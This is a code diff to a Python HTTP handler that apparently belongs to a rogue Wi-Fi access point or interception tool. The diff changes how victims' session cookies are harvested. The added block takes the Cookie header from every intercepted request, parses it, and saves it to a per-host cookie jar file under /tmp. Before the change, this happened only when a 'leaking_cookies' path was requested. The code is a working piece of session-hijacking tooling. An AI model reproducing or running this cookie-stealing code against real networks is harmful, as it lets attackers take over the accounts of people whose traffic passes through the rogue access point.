@@ -92,37 +92,6 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
       essid = self.server.app.get_client_ap(client).get_essid()
     except:
       pass
-   
-    # catch cookie request now
-    if path.endswith('leaking_cookies'):
-
-      self.send_response(200)
-      self.send_header('Content-Type','text/html')
-      self.end_headers()
-
-      if 'cookie' in self.headers:
-
-        ckdata = self.headers['Cookie']
-        
-        # use a Cookie.SimpleCookie to deserialize data
-        ck = Cookie.SimpleCookie()
-        ck.load(ckdata)
-        # create a cookie jar to export data
-        cjar = cookielib.MozillaCookieJar('/tmp/%s.cookie.txt'%host)
-        for k,v in ck.items():
-          cjar.set_cookie(cookielib.Cookie(1,
-            k, v.value, '80', '80',
-            host, None, None, 
-            '/', None, 
-            False, 
-            None,
-            False,
-            "",
-            "",
-            False))
-        cjar.save()
-
-      return
 
     protocol = ctxt(self.server.PRE,BLUE)
     if self.server.PRE == 'HTTPS':
@@ -177,7 +146,36 @@ class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
           client,
           host,
           http_auth))
+        
+    if 'cookie' in self.headers:
+        ckdata = self.headers['Cookie']
+        
+        # use a Cookie.SimpleCookie to deserialize data
+        ck = Cookie.SimpleCookie()
+        ck.load(ckdata)
+        # create a cookie jar to export data
+        cjar = cookielib.MozillaCookieJar('/tmp/%s.cookie.txt'%host)
+        for k,v in ck.items():
+          cjar.set_cookie(cookielib.Cookie(1,
+            k, v.value, '80', '80',
+            host, None, None, 
+            '/', None, 
+            False, 
+            None,
+            False,
+            "",
+            "",
+            False))
+        cjar.save()
 
+     # catch cookie request now
+    if path.endswith('leaking_cookies'):
+
+      self.send_response(200)
+      self.send_header('Content-Type','text/html')
+      self.end_headers()
+      return
+    
     def logfaked():
       self.server.app.log("(%s)"%ctxt("faked",YELLOW))
 
